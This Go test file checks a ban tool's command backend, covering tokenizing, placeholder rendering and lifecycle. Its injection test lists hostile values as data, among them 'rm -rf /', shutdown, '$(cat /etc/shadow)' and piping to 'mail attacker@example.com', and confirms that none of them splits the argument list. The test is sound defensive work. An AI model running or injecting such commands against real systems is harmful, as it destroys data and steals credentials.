package action

import (
	"context"
	"slices"
	"strings"
	"testing"
)

func TestTokenize(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		in      string
		want    []string
		wantErr bool
	}{
		{name: "simple", in: "/sbin/block 1.2.3.4", want: []string{"/sbin/block", "1.2.3.4"}},
		{name: "collapses whitespace", in: "  a \t b \n c  ", want: []string{"a", "b", "c"}},
		{name: "single quotes are literal", in: `echo 'a b "c"'`, want: []string{"echo", `a b "c"`}},
		{name: "double quotes group", in: `echo "a b" c`, want: []string{"echo", "a b", "c"}},
		{name: "escaped quote inside double quotes", in: `echo "a\"b"`, want: []string{"echo", `a"b`}},
		{name: "backslash escapes a space", in: `echo a\ b`, want: []string{"echo", "a b"}},
		{name: "empty quotes produce an empty argument", in: `echo "" x`, want: []string{"echo", "", "x"}},
		{name: "adjacent quoting concatenates", in: `echo a"b c"d`, want: []string{"echo", "ab cd"}},
		{name: "semicolons are just characters", in: "a ; b", want: []string{"a", ";", "b"}},
		{name: "empty input", in: "   ", want: nil},
		{name: "unterminated single quote", in: `echo 'oops`, wantErr: true},
		{name: "unterminated double quote", in: `echo "oops`, wantErr: true},
		{name: "trailing backslash", in: `echo a\`, wantErr: true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got, err := tokenize(tc.in)
			if tc.wantErr != (err != nil) {
				t.Fatalf("tokenize(%q) error = %v, wantErr = %v", tc.in, err, tc.wantErr)
			}
			if tc.wantErr {
				return
			}
			if !slices.Equal(got, tc.want) {
				t.Fatalf("tokenize(%q) = %#v, want %#v", tc.in, got, tc.want)
			}
		})
	}
}

// TestCmdInjection is the security test for this package: {matched} is
// attacker-controlled text lifted straight out of a log line, and it must be
// impossible for it to become a second command or even a second argument.
func TestCmdInjection(t *testing.T) {
	t.Parallel()

	const template = `/usr/local/bin/notify {ip} {monitor} {matched}`

	tests := []struct {
		name    string
		matched string
	}{
		{name: "command chaining", matched: "; rm -rf /"},
		{name: "and chaining", matched: "x && shutdown -h now"},
		{name: "pipe", matched: "x | mail attacker@example.com"},
		{name: "backticks", matched: "`id`"},
		{name: "dollar substitution", matched: "$(cat /etc/shadow)"},
		{name: "variable", matched: "$HOME"},
		{name: "newline", matched: "line1\nrm -rf /\n"},
		{name: "carriage return", matched: "x\rrm -rf /"},
		{name: "single quote break-out", matched: `' ; rm -rf / ; '`},
		{name: "double quote break-out", matched: `" ; rm -rf / ; "`},
		{name: "spaces become no extra args", matched: "a b c d e"},
		{name: "tab", matched: "a\tb"},
		{name: "redirection", matched: "> /etc/passwd"},
		{name: "glob", matched: "*"},
		{name: "brace looks like a variable", matched: "{ip}{matched}{nope}"},
		{name: "NUL byte", matched: "evil\x00rm -rf /"},
		{name: "everything at once", matched: "'\"`$(x)`\n;| & \x00 {ip}"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			f := &fakeRunner{}
			b, err := New(Spec{Name: "cmd", Ban: template, Unban: "/bin/true {ip}"}, f, discardLogger())
			if err != nil {
				t.Fatalf("New: %v", err)
			}
			ban := testBan(t, "203.0.113.7")
			ban.Matched = tc.matched
			if err := b.Ban(context.Background(), ban); err != nil {
				t.Fatalf("Ban: %v", err)
			}

			got := f.last(t)
			// Exactly four elements: the value can never split the argv.
			if len(got) != 4 {
				t.Fatalf("argv has %d elements, want 4 (injection!): %#v", len(got), got)
			}
			requireArgv(t, got[:3], []string{"/usr/local/bin/notify", "203.0.113.7", "sshd"})

			want := strings.ReplaceAll(tc.matched, "\x00", "")
			if got[3] != want {
				t.Fatalf("matched argument = %q, want %q", got[3], want)
			}
			// execve rejects NUL, so it must have been stripped rather than
			// left to turn every ban into a failure.
			if strings.ContainsRune(got[3], 0) {
				t.Fatal("NUL byte survived into argv")
			}
			// And nothing must have been run through a shell.
			f.mu.Lock()
			shell := f.calls[len(f.calls)-1].shell
			f.mu.Unlock()
			if shell {
				t.Fatal("cmd backend used a shell without shell: true")
			}
		})
	}
}

func TestCmdRendering(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		tmpl string
		ip   string
		want []string
	}{
		{
			name: "all variables",
			tmpl: "/b {ip} {monitor} {count} {bantime} {family}",
			ip:   "203.0.113.7",
			want: []string{"/b", "203.0.113.7", "sshd", "5", "1h0m0s", "inet"},
		},
		{
			name: "IPv6 family",
			tmpl: "/b {ip} {family}",
			ip:   "2001:db8::1",
			want: []string{"/b", "2001:db8::1", "inet6"},
		},
		{
			name: "v4-mapped renders as IPv4",
			tmpl: "/b {ip} {family}",
			ip:   "::ffff:192.0.2.1",
			want: []string{"/b", "192.0.2.1", "inet"},
		},
		{
			name: "variables inside a quoted argument stay one argument",
			tmpl: `/b --msg "banned {ip} from {monitor}"`,
			ip:   "203.0.113.7",
			want: []string{"/b", "--msg", "banned 203.0.113.7 from sshd"},
		},
		{
			name: "unknown placeholders are left alone (nft braces etc.)",
			tmpl: "/b {ip} {unknown} {}",
			ip:   "203.0.113.7",
			want: []string{"/b", "203.0.113.7", "{unknown}", "{}"},
		},
		{
			name: "adjacent variables",
			tmpl: "/b {ip}/{family}",
			ip:   "203.0.113.7",
			want: []string{"/b", "203.0.113.7/inet"},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			f := &fakeRunner{}
			b, err := New(Spec{Name: "cmd", Ban: tc.tmpl, Unban: "/u {ip}"}, f, discardLogger())
			if err != nil {
				t.Fatalf("New: %v", err)
			}
			if err := b.Ban(context.Background(), testBan(t, tc.ip)); err != nil {
				t.Fatalf("Ban: %v", err)
			}
			requireArgv(t, f.last(t), tc.want)
		})
	}
}

func TestCmdLifecycle(t *testing.T) {
	t.Parallel()
	f := &fakeRunner{}
	spec := Spec{
		Name:  "cmd",
		Start: "/s init",
		Ban:   "/b {ip}",
		Unban: "/u {ip}",
		Stop:  "/x teardown",
	}
	b, err := New(spec, f, discardLogger())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	if b.Name() != "cmd" {
		t.Fatalf("Name = %q, want cmd", b.Name())
	}
	ban := testBan(t, "203.0.113.7")
	ctx := context.Background()
	for _, step := range []func() error{
		func() error { return b.Start(ctx) },
		func() error { return b.Ban(ctx, ban) },
		func() error { return b.Unban(ctx, ban) },
		func() error { return b.Stop(ctx) },
	} {
		if err := step(); err != nil {
			t.Fatalf("lifecycle step: %v", err)
		}
	}
	requireArgvSeq(t, f.argvs(), [][]string{
		{"/s", "init"},
		{"/b", "203.0.113.7"},
		{"/u", "203.0.113.7"},
		{"/x", "teardown"},
	})
}

func TestCmdOptionalTemplatesAreSkipped(t *testing.T) {
	t.Parallel()
	f := &fakeRunner{}
	b, err := New(Spec{Name: "cmd", Ban: "/b {ip}", Unban: "/u {ip}"}, f, discardLogger())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	if err := b.Start(context.Background()); err != nil {
		t.Fatalf("Start: %v", err)
	}
	if err := b.Stop(context.Background()); err != nil {
		t.Fatalf("Stop: %v", err)
	}
	if n := len(f.argvs()); n != 0 {
		t.Fatalf("ran %d commands for absent templates, want 0", n)
	}
}

func TestCmdConfigErrors(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		spec Spec
	}{
		{name: "no ban template", spec: Spec{Name: "cmd", Unban: "/u {ip}"}},
		{name: "no unban template", spec: Spec{Name: "cmd", Ban: "/b {ip}"}},
		{name: "unterminated quote in ban", spec: Spec{Name: "cmd", Ban: `/b "{ip}`, Unban: "/u {ip}"}},
		{name: "unterminated quote in start", spec: Spec{Name: "cmd", Start: "/s 'x", Ban: "/b", Unban: "/u"}},
		{name: "unknown backend", spec: Spec{Name: "nftables"}},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if _, err := New(tc.spec, &fakeRunner{}, discardLogger()); err == nil {
				t.Fatal("New should have rejected this spec")
			}
		})
	}
}

// TestCmdShellIsOptIn documents the escape hatch: with shell: true the
// template is handed to sh verbatim, injection guarantees and all.
func TestCmdShellIsOptIn(t *testing.T) {
	t.Parallel()
	f := &fakeRunner{}
	b, err := New(Spec{
		Name:  "cmd",
		Ban:   "nft add element inet banhammer banned { {ip} timeout {bantime} }",
		Unban: "nft delete element inet banhammer banned { {ip} }",
		Shell: true,
	}, f, discardLogger())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	if err := b.Ban(context.Background(), testBan(t, "203.0.113.7")); err != nil {
		t.Fatalf("Ban: %v", err)
	}
	requireArgv(t, f.last(t), []string{"nft add element inet banhammer banned { 203.0.113.7 timeout 1h0m0s }"})
	f.mu.Lock()
	defer f.mu.Unlock()
	if !f.calls[len(f.calls)-1].shell {
		t.Fatal("shell: true did not reach the Runner")
	}
}

func TestCmdMatchedIsTruncated(t *testing.T) {
	t.Parallel()
	f := &fakeRunner{}
	b, err := New(Spec{Name: "cmd", Ban: "/b {matched}", Unban: "/u"}, f, discardLogger())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	// A 64 KiB log line must not become a 64 KiB argument.
	ban := testBan(t, "203.0.113.7")
	ban.Matched = strings.Repeat("é", 40000)
	if err := b.Ban(context.Background(), ban); err != nil {
		t.Fatalf("Ban: %v", err)
	}
	got := f.last(t)
	if len(got) != 2 {
		t.Fatalf("argv = %#v, want 2 elements", got)
	}
	if len(got[1]) > maxMatchedLen {
		t.Fatalf("matched argument is %d bytes, want <= %d", len(got[1]), maxMatchedLen)
	}
	if !strings.ContainsRune(got[1], 'é') || strings.ContainsRune(got[1], '\uFFFD') {
		t.Fatalf("truncation broke UTF-8: %q", got[1])
	}
}

// TestCmdMissingMatchedRendersEmpty covers manual bans, where Ban.Matched is
// empty: the variable must render as an empty argument, not vanish and shift
// the rest of the argv.
func TestCmdMissingMatchedRendersEmpty(t *testing.T) {
	t.Parallel()
	f := &fakeRunner{}
	b, err := New(Spec{Name: "cmd", Ban: "/b {matched} end", Unban: "/u"}, f, discardLogger())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	if err := b.Ban(context.Background(), testBan(t, "203.0.113.7")); err != nil {
		t.Fatalf("Ban: %v", err)
	}
	requireArgv(t, f.last(t), []string{"/b", "", "end"})
}

func TestCmdPropagatesFailure(t *testing.T) {
	t.Parallel()
	f := &fakeRunner{handler: func([]string, bool) ([]byte, error) {
		return nil, exitErr(127, "sh: /b: not found")
	}}
	b, err := New(Spec{Name: "cmd", Ban: "/b {ip}", Unban: "/u {ip}"}, f, discardLogger())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	err = b.Ban(context.Background(), testBan(t, "203.0.113.7"))
	if err == nil {
		t.Fatal("Ban should report the command failure")
	}
	if ExitCode(err) != 127 {
		t.Fatalf("ExitCode = %d, want 127 (error must stay unwrappable)", ExitCode(err))
	}
}
